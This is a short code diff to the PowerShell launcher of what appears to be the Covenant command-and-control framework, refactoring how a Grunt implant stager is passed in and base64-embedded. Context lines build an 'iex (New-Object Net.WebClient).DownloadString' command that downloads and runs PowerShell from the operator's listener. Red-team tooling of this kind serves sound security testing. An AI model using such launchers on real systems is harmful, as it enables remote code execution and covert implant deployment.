@@ -22,6 +22,7 @@ namespace Covenant.Models.Launchers
             this.Description = "Uses powershell.exe to launch a Grunt using [System.Reflection.Assembly]::Load()";
             this.Name = "PowerShell";
             this.OutputKind = OutputKind.WindowsApplication;
+            this.CompressStager = true;
         }
 
         public PowerShellLauncher(String parameterString) : base()
@@ -29,10 +30,10 @@ namespace Covenant.Models.Launchers
             this.ParameterString = parameterString;
         }
 
-        public override string GetLauncher(Listener listener, Grunt grunt, HttpProfile profile, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
-            this.StagerCode = listener.GetGruntStagerCode(grunt, profile, template);
-            this.Base64ILByteString = listener.CompileGruntStagerCode(grunt, profile, template, this.OutputKind, true);
+            this.StagerCode = StagerCode;
+            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
             this.PowerShellCode = PowerShellLauncherCodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
             return GetLauncher(PowerShellCode);
         }
@@ -57,7 +58,7 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-				Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
+				Uri hostedLocation = new Uri(httpListener.Urls + hostedFile.Path);
                 string code = "iex (New-Object Net.WebClient).DownloadString('" + hostedLocation + "')";
                 this.LauncherString = GetLauncher(code);
                 return this.LauncherString;
